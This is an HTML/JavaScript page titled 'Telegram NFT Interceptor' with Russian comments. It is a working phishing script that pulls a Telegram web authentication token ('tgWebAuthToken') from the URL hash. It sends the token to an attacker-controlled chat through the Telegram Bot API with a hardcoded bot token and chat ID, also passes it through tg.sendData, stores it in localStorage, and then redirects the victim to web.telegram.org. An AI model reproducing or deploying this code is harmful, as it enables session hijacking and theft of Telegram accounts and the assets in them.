<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram NFT Interceptor</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0a0a;
            color: #00ffaa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: #1e1e1e;
            border-radius: 24px;
            padding: 24px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 0 30px rgba(0,255,170,0.2);
            border: 1px solid #00ffaa33;
        }
        h2 {
            text-align: center;
            color: #00ffaa;
            margin-top: 0;
        }
        .log {
            background: #2d2d2d;
            border-radius: 12px;
            padding: 16px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid #00ffaa33;
            color: #00ffaa;
            max-height: 400px;
            overflow-y: auto;
        }
        .good { color: #00ffaa; }
        .bad { color: #ff5555; }
        .info { color: #ffaa00; }
    </style>
</head>
<body>
    <div class="card">
        <h2>üîê Telegram NFT Interceptor</h2>
        <div class="log" id="log">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    </div>

    <script>
        // ========== –¢–í–û–ò –î–ê–ù–ù–´–ï (—É–∂–µ –≤—Å—Ç–∞–≤–ª–µ–Ω—ã) ==========
        const BOT_TOKEN = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
        const CHAT_ID = '8220267007';
        // =================================================

        const logDiv = document.getElementById('log');
        function addLog(text, type = 'info') {
            const color = type === 'good' ? 'good' : (type === 'bad' ? 'bad' : 'info');
            logDiv.innerHTML += `<div class="${color}">${text}</div>`;
            console.log(text);
        }

        addLog('üöÄ –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω');

        // 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç–æ –ª–∏ –≤–Ω—É—Ç—Ä–∏ Telegram WebApp
        let tg = null;
        if (window.Telegram && window.Telegram.WebApp) {
            tg = window.Telegram.WebApp;
            tg.ready();
            tg.expand(); // —Ä–∞—Å—Ç—è–Ω—É—Ç—å –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
            addLog('‚úÖ Telegram WebApp –¥–æ—Å—Ç—É–ø–µ–Ω', 'good');
        } else {
            addLog('‚ùå Telegram WebApp –ù–ï –î–û–°–¢–£–ü–ï–ù (–æ—Ç–∫—Ä—ã—Ç–æ –Ω–µ —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É –±–æ—Ç–∞!)', 'bad');
        }

        // 2. –ü–æ–ª—É—á–∞–µ–º URL –∏ —Ö–µ—à
        const currentUrl = window.location.href;
        const hash = window.location.hash;
        addLog(`üìç –¢–µ–∫—É—â–∏–π URL: ${currentUrl}`);
        addLog(`#Ô∏è‚É£ –•–µ—à: ${hash || '–ø—É—Å—Ç–æ'}`);

        // 3. –ï—Å–ª–∏ –µ—Å—Ç—å —Ç–æ–∫–µ–Ω ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
        if (hash && hash.includes('tgWebAuthToken')) {
            addLog('üîë –ù–ê–ô–î–ï–ù –¢–û–ö–ï–ù!', 'good');
            addLog(hash.substring(0, 100) + '...', 'info');

            // ----- –°–ø–æ—Å–æ–± 1: –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Telegram WebApp (tg.sendData) -----
            if (tg) {
                try {
                    tg.sendData(hash);
                    addLog('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ tg.sendData()', 'good');
                } catch (e) {
                    addLog(`‚ùå –û—à–∏–±–∫–∞ tg.sendData: ${e.message}`, 'bad');
                }
            } else {
                addLog('‚ö†Ô∏è tg.sendData() –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω', 'bad');
            }

            // ----- –°–ø–æ—Å–æ–± 2: –ü—Ä—è–º–æ–π –∑–∞–ø—Ä–æ—Å –∫ Telegram Bot API (fetch) -----
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `üîê –ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω —Ç–æ–∫–µ–Ω!\n${hash}`,
                    parse_mode: 'HTML'
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) addLog('‚úÖ fetch: —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ', 'good');
                else addLog(`‚ùå fetch: –æ—à–∏–±–∫–∞ API: ${JSON.stringify(data)}`, 'bad');
            })
            .catch(err => addLog(`‚ùå fetch: –æ—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${err.message}`, 'bad'));

            // ----- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage -----
            try {
                localStorage.setItem('last_token', hash);
                addLog('‚úÖ –¢–æ–∫–µ–Ω —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ localStorage', 'good');
            } catch (e) {}

            addLog('‚è≥ –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ web.telegram.org —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...');
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/k/';
            }, 5000);
        } else {
            addLog('üîÑ –¢–æ–∫–µ–Ω–∞ –Ω–µ—Ç, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ Telegram –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏...');
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/k/';
            }, 2000);
        }
    </script>
</body>
</html>
